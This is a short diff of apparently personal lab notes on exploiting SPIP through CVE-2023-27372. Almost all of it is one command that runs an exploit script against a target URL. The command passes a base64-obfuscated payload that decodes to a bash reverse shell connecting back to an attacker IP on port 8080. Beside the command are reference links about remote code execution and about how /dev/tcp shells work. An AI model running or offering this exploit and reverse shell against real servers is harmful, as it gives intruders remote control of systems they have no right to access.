@@ -1,5 +1,7 @@
 Python3
 Supporting Link : https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/rce
+https://stackoverflow.com/questions/76899269/can-someone-explain-how-does-this-command-works-bash-i-dev-tcp-ip-port
 
 python3 CVE-2023-27372.py -u http://10.10.81.78/spip/ -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMy44MS40NS84MDgwIDA+JjEK | base64 -d |bash'
-https://stackoverflow.com/questions/76899269/can-someone-explain-how-does-this-command-works-bash-i-dev-tcp-ip-port
+  ~ RCE | CVE with Target Machine | Base64 decoded 
+
